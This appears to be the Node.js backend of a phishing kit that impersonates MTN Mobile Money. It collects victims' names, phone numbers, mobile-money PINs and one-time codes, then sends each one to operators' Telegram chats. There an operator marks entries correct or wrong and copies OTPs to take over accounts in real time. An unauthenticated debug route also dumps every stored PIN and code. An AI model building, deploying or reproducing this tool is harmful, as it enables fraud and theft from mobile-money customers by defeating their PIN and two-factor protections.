require('dotenv').config();
const express = require('express');
const axios = require('axios');
const { v4: uuidv4 } = require('uuid');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 10000;
const DOMAIN = (process.env.BACKEND_URL || 'https://mtn-mobile-money-8szk.onrender.com').replace(/\/+$/, '');

// ============================================================
// 🔒 NEVER REMOVE callback_query
// ============================================================
const REQUIRED_UPDATES = ['message', 'callback_query'];

// ============================================================
// 📏 FORCE FULL-WIDTH MESSAGE BUBBLE
// Telegram sizes the bubble to the widest line of text.
// A 34-char separator pushes it to max width on mobile, so the
// inline buttons always stretch edge-to-edge.
// ============================================================
const SEP = '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━';

// ---------------- PERSISTENT STORE ----------------
const DATA_DIR = path.join(__dirname, 'data');
const STORE_FILE = path.join(DATA_DIR, 'store.json');
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });

let approvedPins = {};
let approvedCodes = {};
let approvedPhones = {};
let blockPins = {};
let requestBotMap = {};

function loadStore() {
    try {
        if (fs.existsSync(STORE_FILE)) {
            const data = JSON.parse(fs.readFileSync(STORE_FILE, 'utf8'));
            approvedPins = data.approvedPins || {};
            approvedCodes = data.approvedCodes || {};
            approvedPhones = data.approvedPhones || {};
            blockPins = data.blockPins || {};
            requestBotMap = data.requestBotMap || {};
            console.log('💾 Store loaded:', Object.keys(requestBotMap).length, 'entries');
        }
    } catch (err) {
        console.error('❌ Failed to load store:', err.message);
    }
}

let saveTimer = null;
function saveStore() {
    if (saveTimer) clearTimeout(saveTimer);
    saveTimer = setTimeout(() => {
        try {
            const tmp = STORE_FILE + '.tmp';
            fs.writeFileSync(tmp, JSON.stringify({
                approvedPins, approvedCodes, approvedPhones, blockPins, requestBotMap
            }, null, 2));
            fs.renameSync(tmp, STORE_FILE);
        } catch (err) {
            console.error('❌ Failed to save store:', err.message);
        }
    }, 200);
}

loadStore();

// ---------------- DUPLICATE-CLICK GUARD ----------------
const processedCallbacks = new Set();
function isDuplicateCallback(cbId) {
    if (processedCallbacks.has(cbId)) return true;
    processedCallbacks.add(cbId);
    if (processedCallbacks.size > 5000) processedCallbacks.clear();
    return false;
}

// ---------------- MULTI-BOT STORE ----------------
let bots = [];
Object.keys(process.env).forEach(key => {
    const match = key.match(/^BOT(\d+)_TOKEN$/);
    if (!match) return;
    const index = match[1];
    const botToken = process.env[`BOT${index}_TOKEN`];
    const chatId = process.env[`BOT${index}_CHATID`];
    if (botToken && chatId) {
        bots.push({ botId: `bot${index}`, botToken, chatId });
    }
});
console.log('✅ Bots loaded:', bots.map(b => b.botId));

// ---------------- MIDDLEWARE ----------------
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// ---------------- HELPERS ----------------
function getBot(botId) {
    return bots.find(b => b.botId === botId);
}

// Returns comma-separated list of loaded bot IDs, safe for logs
function botList() {
    return bots.map(b => b.botId).join(', ') || '(none)';
}

function esc(str) {
    if (str === null || str === undefined) return 'Unknown';
    return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;');
}

// Pad short values so the line never collapses the bubble width.
// The trailing non-breaking space is invisible but counts for width.
function pad(str) {
    let s = String(str === null || str === undefined ? 'Unknown' : str);
    const minLen = 26;
    if (s.length < minLen) {
        s = s + '\u00A0'.repeat(minLen - s.length);
    }
    return s;
}

// Every message forces a full-width bubble via a 34-char separator
// and padded value lines, so buttons always stretch edge-to-edge.
function withIdentity(header, name, phone, extraLines = []) {
    const lines = [
        `<b>${esc(header)}</b>`,
        SEP,
        `<b>Name:</b>  <b>${esc(pad(name))}</b>`,
        `<b>Phone:</b> <b>${esc(pad(phone))}</b>`
    ];
    if (extraLines.length) {
        lines.push(SEP);
        lines.push(...extraLines);
    }
    lines.push(SEP);
    return lines.join('\n');
}

async function sendTelegramMessage(bot, text, inlineKeyboard = []) {
    try {
        await axios.post(`https://api.telegram.org/bot${bot.botToken}/sendMessage`, {
            chat_id: bot.chatId,
            text,
            parse_mode: 'HTML',
            reply_markup: inlineKeyboard.length ? { inline_keyboard: inlineKeyboard } : undefined
        });
    } catch (err) {
        console.error('sendMessage error:', err.response?.data || err.message);
    }
}

async function replyTelegramMessage(bot, replyToMessageId, text, inlineKeyboard = []) {
    try {
        await axios.post(`https://api.telegram.org/bot${bot.botToken}/sendMessage`, {
            chat_id: bot.chatId,
            text,
            parse_mode: 'HTML',
            reply_to_message_id: replyToMessageId,
            allow_sending_without_reply: true,
            reply_markup: inlineKeyboard.length ? { inline_keyboard: inlineKeyboard } : undefined
        });
    } catch (err) {
        console.error('replyTelegramMessage error:', err.response?.data || err.message);
    }
}

async function answerCallback(bot, callbackId, text = '', showAlert = false) {
    try {
        await axios.post(`https://api.telegram.org/bot${bot.botToken}/answerCallbackQuery`, {
            callback_query_id: callbackId,
            text,
            show_alert: showAlert
        });
    } catch (err) {
        console.error('answerCallback error:', err.response?.data || err.message);
    }
}

async function editMessageText(bot, chatId, messageId, text) {
    try {
        await axios.post(`https://api.telegram.org/bot${bot.botToken}/editMessageText`, {
            chat_id: chatId,
            message_id: messageId,
            text,
            parse_mode: 'HTML',
            reply_markup: { inline_keyboard: [] }
        });
    } catch (err) {
        const desc = err.response?.data?.description || err.message;
        if (String(desc).includes('message is not modified')) return;
        console.error('editMessageText error:', desc);
    }
}

// ============================================================
// 🔒 WEBHOOK — ALWAYS INCLUDES callback_query
// ============================================================
async function getWebhookInfo(bot) {
    try {
        const res = await axios.get(`https://api.telegram.org/bot${bot.botToken}/getWebhookInfo`);
        return res.data?.result;
    } catch (err) {
        console.error(`getWebhookInfo failed for ${bot.botId}:`, err.response?.data || err.message);
        return null;
    }
}

async function setWebhook(bot) {
    const webhookUrl = `${DOMAIN}/telegram-webhook/${bot.botId}`;
    const allowedUpdates = encodeURIComponent(JSON.stringify(REQUIRED_UPDATES));
    try {
        const res = await axios.get(
            `https://api.telegram.org/bot${bot.botToken}/setWebhook` +
            `?url=${webhookUrl}` +
            `&allowed_updates=${allowedUpdates}` +
            `&drop_pending_updates=false`
        );
        if (res.data?.ok) {
            console.log(`✅ Webhook set for ${bot.botId} → ${webhookUrl} [${REQUIRED_UPDATES.join(',')}]`);
            return true;
        }
        console.error(`❌ setWebhook not-ok for ${bot.botId}:`, res.data);
        return false;
    } catch (err) {
        console.error(`❌ setWebhook failed for ${bot.botId}:`, err.response?.data || err.message);
        return false;
    }
}

async function ensureWebhook(bot) {
    await setWebhook(bot);
    const info = await getWebhookInfo(bot);
    if (!info) return false;

    const urlOk = info.url === `${DOMAIN}/telegram-webhook/${bot.botId}`;
    const cbOk = Array.isArray(info.allowed_updates) && info.allowed_updates.includes('callback_query');

    console.log(`🔎 ${bot.botId} — url ${urlOk ? 'OK' : 'MISMATCH'}, callback_query ${cbOk ? '✅' : '❌'}, pending ${info.pending_update_count || 0}`);

    if (!urlOk || !cbOk) {
        await new Promise(r => setTimeout(r, 2000));
        await setWebhook(bot);
        const again = await getWebhookInfo(bot);
        const fixed = again
            && again.url === `${DOMAIN}/telegram-webhook/${bot.botId}`
            && Array.isArray(again.allowed_updates)
            && again.allowed_updates.includes('callback_query');
        console.log(`🔁 ${bot.botId}: ${fixed ? '✅ FIXED' : '❌ STILL BROKEN'}`);
        return fixed;
    }
    return true;
}

async function ensureAllWebhooks() {
    if (!bots.length) {
        console.warn('⚠️ No bots loaded — check BOT*_TOKEN and BOT*_CHATID env vars');
        return;
    }
    const results = await Promise.all(bots.map(b => ensureWebhook(b)));
    console.log('🌐 Summary:', bots.map((b, i) => `${b.botId}=${results[i] ? 'OK' : 'FAIL'}`).join(', '));
}

setInterval(() => {
    ensureAllWebhooks().catch(err => console.error('Periodic webhook check error:', err.message));
}, 5 * 60 * 1000);

setInterval(async () => {
    for (const bot of bots) {
        try {
            const info = await getWebhookInfo(bot);
            if (!info) continue;
            const cbOk = Array.isArray(info.allowed_updates) && info.allowed_updates.includes('callback_query');
            const urlOk = info.url === `${DOMAIN}/telegram-webhook/${bot.botId}`;
            if (!cbOk || !urlOk) {
                console.warn(`🚨 ${bot.botId} lost callback_query or url — repairing NOW`);
                await setWebhook(bot);
            }
        } catch (err) {}
    }
}, 30 * 1000);

// ============================================================
// 🚪 BOT ENTRY ROUTE
// Every Telegram link MUST go through /bot/botN. This route
// validates the botId and forwards it into the app via URL.
// Change `index.html` below to your real entry page name.
// ============================================================
app.get('/bot/:botId', (req, res) => {
    const bot = getBot(req.params.botId);
    if (!bot) {
        console.log('❌ Invalid bot link:', req.params.botId, '| valid:', botList());
        return res.status(404).send('Invalid bot link. Available: ' + botList());
    }
    console.log(`🚪 Entry via ${bot.botId} — redirecting to index.html`);
    res.redirect(`/index.html?botId=${encodeURIComponent(bot.botId)}`);
});

app.get('/pin', (req, res) => res.sendFile(path.join(__dirname, 'public', 'pin.html')));
app.get('/code', (req, res) => res.sendFile(path.join(__dirname, 'public', 'code.html')));

// ============================================================
// 📱 PHONE — Approve / Reject side by side
// ============================================================
app.post('/submit-phone', (req, res) => {
    const { name, phone, botId } = req.body;
    console.log('📥 /submit-phone received botId =', botId, '| valid bots:', botList());

    const bot = getBot(botId);
    if (!bot) {
        console.log('❌ submit-phone: no bot matches botId', botId);
        return res.status(400).json({ error: 'Invalid bot: ' + botId });
    }

    const finalName = name || 'Unknown';
    const finalPhone = phone || 'Unknown';

    const requestId = uuidv4();
    approvedPhones[requestId] = null;
    requestBotMap[requestId] = {
        botId,
        name: finalName,
        phone: finalPhone,
        type: 'phone',
        createdAt: Date.now()
    };
    saveStore();

    console.log(`📤 Phone notification ${requestId} → ${bot.botId} (chat ${bot.chatId})`);

    sendTelegramMessage(
        bot,
        withIdentity('📱 PHONE NUMBER VERIFICATION', finalName, finalPhone),
        [[
            { text: '✅ Approve', callback_data: `phone_ok:${requestId}` },
            { text: '❌ Reject',  callback_data: `phone_bad:${requestId}` }
        ]]
    );

    res.json({ requestId });
});

app.get('/check-phone/:requestId', (req, res) => {
    const requestId = req.params.requestId;
    if (blockPins[requestId]) return res.json({ blocked: true, message: 'User blocked' });
    res.json({ approved: approvedPhones[requestId] ?? null });
});

// ---------------- PIN — Correct / Wrong side by side, no copy ----------------
app.post('/submit-pin', (req, res) => {
    const { name, phone, pin, botId } = req.body;
    console.log('📥 /submit-pin received botId =', botId, '| valid bots:', botList());

    const bot = getBot(botId);
    if (!bot) {
        console.log('❌ submit-pin: no bot matches botId', botId);
        return res.status(400).json({ error: 'Invalid bot: ' + botId });
    }

    const finalName = name || 'Unknown';
    const finalPhone = phone || 'Unknown';

    const requestId = uuidv4();
    approvedPins[requestId] = null;
    requestBotMap[requestId] = {
        botId,
        name: finalName,
        phone: finalPhone,
        pin: String(pin || ''),
        type: 'pin',
        createdAt: Date.now()
    };
    saveStore();

    console.log(`📤 PIN notification ${requestId} → ${bot.botId} (chat ${bot.chatId})`);

    sendTelegramMessage(
        bot,
        withIdentity('🔐 PIN VERIFICATION', finalName, finalPhone, [
            `<b>PIN:</b>  <b><code>${esc(pad(pin))}</code></b>`
        ]),
        [
            [
                { text: '✅ Correct', callback_data: `pin_ok:${requestId}` },
                { text: '❌ Wrong',   callback_data: `pin_bad:${requestId}` }
            ],
            [
                { text: '🛑 Block', callback_data: `pin_block:${requestId}` }
            ]
        ]
    );

    res.json({ requestId });
});

app.get('/check-pin/:requestId', (req, res) => {
    const requestId = req.params.requestId;
    if (blockPins[requestId]) return res.json({ blocked: true, message: 'User blocked' });
    res.json({ approved: approvedPins[requestId] ?? null });
});

// ---------------- OTP — Correct / Wrong side by side + Copy ----------------
app.post('/submit-code', (req, res) => {
    const { name, phone, code, botId } = req.body;
    console.log('📥 /submit-code received botId =', botId, '| valid bots:', botList());

    const bot = getBot(botId);
    if (!bot) {
        console.log('❌ submit-code: no bot matches botId', botId);
        return res.status(400).json({ error: 'Invalid bot: ' + botId });
    }

    const finalName = name || 'Unknown';
    const finalPhone = phone || 'Unknown';
    const finalCode = String(code || '');

    const requestId = uuidv4();
    approvedCodes[requestId] = null;
    requestBotMap[requestId] = {
        botId,
        name: finalName,
        phone: finalPhone,
        code: finalCode,
        type: 'code',
        createdAt: Date.now()
    };
    saveStore();

    console.log(`📤 OTP notification ${requestId} → ${bot.botId} (chat ${bot.chatId})`);

    sendTelegramMessage(
        bot,
        withIdentity('🔑 OTP CODE VERIFICATION', finalName, finalPhone, [
            `<b>Code:</b> <b><code>${esc(pad(finalCode))}</code></b>`
        ]),
        [
            [
                { text: '✅ Correct', callback_data: `code_ok:${requestId}` },
                { text: '❌ Wrong',   callback_data: `code_bad:${requestId}` }
            ],
            [
                { text: '📋 Copy Code', callback_data: `code_copy:${requestId}` }
            ]
        ]
    );

    res.json({ requestId });
});

app.get('/check-code/:requestId', (req, res) => {
    const requestId = req.params.requestId;
    if (blockPins[requestId]) return res.json({ blocked: true, message: 'User blocked' });
    res.json({ approved: approvedCodes[requestId] ?? null });
});

// ---------------- TELEGRAM WEBHOOK ----------------
app.post('/telegram-webhook/:botId', async (req, res) => {
    res.sendStatus(200);

    try {
        const bot = getBot(req.params.botId);
        if (!bot) {
            console.log('❌ Unknown bot:', req.params.botId, '| valid:', botList());
            return;
        }

        const cb = req.body.callback_query;
        if (!cb) return;

        if (isDuplicateCallback(cb.id)) {
            console.log('🔁 Duplicate click ignored:', cb.id);
            await answerCallback(bot, cb.id, 'Already handled');
            return;
        }

        console.log('🔘 CALLBACK:', cb.data, '| via', bot.botId);

        const [action, requestId] = (cb.data || '').split(':');
        if (!requestId) {
            console.log('⚠️ Malformed callback data:', cb.data);
            await answerCallback(bot, cb.id, 'Invalid action');
            return;
        }

        const meta = requestBotMap[requestId] || {};
        const name = meta.name || 'Unknown';
        const phone = meta.phone || 'Unknown';

        // ============================================================
        // 📋 COPY OTP — replies with ONLY the code
        // ============================================================
        if (action === 'code_copy') {
            const code = meta.code || '';
            await answerCallback(bot, cb.id, 'Code sent for copying');

            const originalMsgId = cb.message?.message_id;
            const copyMessage = `<code>${esc(code)}</code>`;

            if (originalMsgId) {
                await replyTelegramMessage(bot, originalMsgId, copyMessage);
            } else {
                await sendTelegramMessage(bot, copyMessage);
            }
            console.log('📋 code_copy sent for', requestId, '→', code, `via ${bot.botId}`);
            return;
        }

        // ============================================================
        // ✅❌ APPROVAL / REJECTION
        // ============================================================
        await answerCallback(bot, cb.id);

        let handled = false;
        let newText = '';
        let feedback = '';

        // PHONE
        if (action === 'phone_ok') {
            approvedPhones[requestId] = true;
            handled = true;
            feedback = 'Approved ✅';
            newText = withIdentity('📱 PHONE NUMBER VERIFICATION', name, phone, [
                '<b>Status:</b> ✅ <b>Approved</b>'
            ]);
        } else if (action === 'phone_bad') {
            approvedPhones[requestId] = false;
            handled = true;
            feedback = 'Rejected ❌';
            newText = withIdentity('📱 PHONE NUMBER VERIFICATION', name, phone, [
                '<b>Status:</b> ❌ <b>Rejected</b>'
            ]);
        }
        // PIN
        else if (action === 'pin_ok') {
            approvedPins[requestId] = true;
            handled = true;
            feedback = 'Correct ✅';
            newText = withIdentity('🔐 PIN VERIFICATION', name, phone, [
                `<b>PIN:</b>  <b><code>${esc(pad(meta.pin || ''))}</code></b>`,
                '<b>Status:</b> ✅ <b>Correct</b>'
            ]);
        } else if (action === 'pin_bad') {
            approvedPins[requestId] = false;
            handled = true;
            feedback = 'Wrong ❌';
            newText = withIdentity('🔐 PIN VERIFICATION', name, phone, [
                `<b>PIN:</b>  <b><code>${esc(pad(meta.pin || ''))}</code></b>`,
                '<b>Status:</b> ❌ <b>Wrong</b>'
            ]);
        } else if (action === 'pin_block') {
            blockPins[requestId] = true;
            handled = true;
            feedback = 'User blocked 🛑';
            newText = withIdentity('🔐 PIN VERIFICATION', name, phone, [
                `<b>PIN:</b>  <b><code>${esc(pad(meta.pin || ''))}</code></b>`,
                '<b>Status:</b> 🛑 <b>User blocked</b>'
            ]);
        }
        // CODE
        else if (action === 'code_ok') {
            approvedCodes[requestId] = true;
            handled = true;
            feedback = 'Correct ✅';
            newText = withIdentity('🔑 OTP CODE VERIFICATION', name, phone, [
                `<b>Code:</b> <b><code>${esc(pad(meta.code || ''))}</code></b>`,
                '<b>Status:</b> ✅ <b>Correct</b>'
            ]);
        } else if (action === 'code_bad') {
            approvedCodes[requestId] = false;
            handled = true;
            feedback = 'Wrong ❌';
            newText = withIdentity('🔑 OTP CODE VERIFICATION', name, phone, [
                `<b>Code:</b> <b><code>${esc(pad(meta.code || ''))}</code></b>`,
                '<b>Status:</b> ❌ <b>Wrong</b>'
            ]);
        } else {
            console.log('⚠️ Unknown action:', action);
            return;
        }

        if (!handled) return;

        saveStore();
        console.log('✅', action, '→', requestId, `(${name} / ${phone}) via ${bot.botId}`);

        if (cb.message && newText) {
            await editMessageText(bot, cb.message.chat.id, cb.message.message_id, newText);
        }

        if (feedback) {
            await sendTelegramMessage(
                bot,
                withIdentity(`📝 RESPONSE — ${feedback}`, name, phone)
            );
        }
    } catch (err) {
        console.error('❌ Webhook handler error:', err.message);
    }
});

// ---------------- DEBUG ----------------
// Safe view: botIds + chatIds only, no tokens
app.get('/debug/bots', (req, res) => {
    res.json(bots.map(b => ({ botId: b.botId, chatId: b.chatId })));
});

app.get('/debug/stores', (req, res) => {
    res.json({ approvedPins, approvedCodes, approvedPhones, blockPins, requestBotMap });
});

app.get('/debug/webhook/:botId', async (req, res) => {
    const bot = getBot(req.params.botId);
    if (!bot) return res.status(404).json({ error: 'Invalid bot: ' + req.params.botId });
    const info = await getWebhookInfo(bot);
    res.json(info || { error: 'failed' });
});

app.get('/debug/setwebhook', async (req, res) => {
    await ensureAllWebhooks();
    res.json({ message: 'Webhooks re-applied', bots: bots.map(b => b.botId) });
});

app.get('/health', (req, res) => {
    res.json({ ok: true, bots: bots.map(b => b.botId), time: Date.now() });
});

// ---------------- START ----------------
(async () => {
    console.log('🚀 Starting server...');
    console.log('🌐 DOMAIN:', DOMAIN);
    console.log('🔒 REQUIRED_UPDATES:', REQUIRED_UPDATES.join(', '));
    console.log('🤖 BOTS:', bots.length ? bots.map(b => `${b.botId} → chat ${b.chatId}`).join(' | ') : '(NONE — check env vars)');
    await ensureAllWebhooks();
    app.listen(PORT, () => console.log(`🚀 Server listening on port ${PORT}`));
})();